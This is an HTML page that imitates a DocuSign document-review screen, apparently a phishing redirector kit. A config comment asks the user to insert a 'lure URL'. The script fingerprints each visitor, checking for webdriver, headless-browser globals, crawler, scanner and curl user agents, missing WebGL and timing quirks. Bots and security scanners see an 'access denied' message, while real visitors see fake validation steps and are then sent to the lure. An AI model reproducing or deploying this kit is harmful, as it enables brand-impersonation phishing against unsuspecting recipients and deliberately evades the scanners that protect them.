<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>DocuSign - Review Document</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%23FFCE00'/><text x='16' y='22' text-anchor='middle' fill='%23333' font-size='14' font-family='Arial'>DS</text></svg>">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Helvetica Neue',Arial,sans-serif;background:#fafafa;min-height:100vh;display:flex;flex-direction:column}
.nav{background:#1b0a3c;padding:14px 24px;display:flex;align-items:center;gap:10px}
.nav-logo{color:#fff;font-size:18px;font-weight:700;letter-spacing:-.5px}
.nav-logo span{color:#FFCE00}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.06);max-width:440px;width:100%;padding:40px 36px;text-align:center;border:1px solid #eee}
.envelope-icon{width:56px;height:56px;margin:0 auto 20px;background:#fff7d6;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px}
h1{font-size:20px;color:#1b0a3c;margin-bottom:8px}
.sub{font-size:14px;color:#666;margin-bottom:28px;line-height:1.5}
.steps{display:flex;justify-content:center;gap:8px;margin-bottom:28px}
.step{width:36px;height:4px;background:#e8e8e8;border-radius:2px;transition:background .3s}
.step.done{background:#FFCE00}
.step.active{background:#1b0a3c;animation:stepPulse 1s infinite}
@keyframes stepPulse{0%,100%{opacity:1}50%{opacity:.5}}
.msg{font-size:13px;color:#888}
.blocked{display:none;color:#c0392b;font-size:14px;margin-top:16px}
</style>
</head>
<body>
<div class="nav"><span class="nav-logo">Docu<span>Sign</span></span></div>
<div class="main">
<div class="card">
<div class="envelope-icon">✉️</div>
<h1>Document Ready for Review</h1>
<p class="sub">A document has been sent to you for signature.<br>Validating your access...</p>
<div class="steps"><div class="step" id="s0"></div><div class="step" id="s1"></div><div class="step" id="s2"></div><div class="step" id="s3"></div><div class="step" id="s4"></div></div>
<p class="msg" id="msg">Validating envelope...</p>
<p class="blocked" id="blocked">Session validation failed. Access denied.</p>
</div>
</div>
<script>
/*──── CONFIG: Replace with your lure URL ────*/
var REDIRECT_URL = "https://YOUR-LURE-URL-HERE";
/*────────────────────────────────────────────*/

(function(){
var msg=document.getElementById('msg'),bl=document.getElementById('blocked');
function bad(){bl.style.display='block';msg.style.display='none';document.querySelector('.steps').style.display='none'}
function chk(){
if(navigator.webdriver||window.__nightmare||window.callPhantom||window._phantom)return!1;
if(/bot|crawl|spider|headless|phantom|puppet|selenium|lighthouse|wget|curl|http|scan|preview|fetch|archive|index/i.test(navigator.userAgent))return!1;
try{var c=document.createElement('canvas'),g=c.getContext('webgl')||c.getContext('experimental-webgl');if(!g)return!1}catch(e){return!1}
if(navigator.languages&&navigator.languages.length===0)return!1;
if(!window.chrome&&/Chrome/.test(navigator.userAgent))return!1;
if(screen.width<300||screen.height<300)return!1;
var n=performance.now();for(var i=0;i<1e5;i++)Math.sqrt(i);if(performance.now()-n<0.5)return!1;
return!0
}
if(!chk()){bad();return}
var step=0,msgs=["Validating envelope...","Checking signer identity...","Loading document preview...","Preparing signature fields...","Opening document..."];
function next(){
if(step>0)document.getElementById('s'+(step-1)).classList.replace('active','done');
if(step<5){document.getElementById('s'+step).classList.add('active');msg.textContent=msgs[step];step++}
else{msg.textContent="Redirecting...";setTimeout(function(){window.location.replace(REDIRECT_URL)},400)}
}
next();setInterval(next,1000);
})();
</script>
</body>
</html>
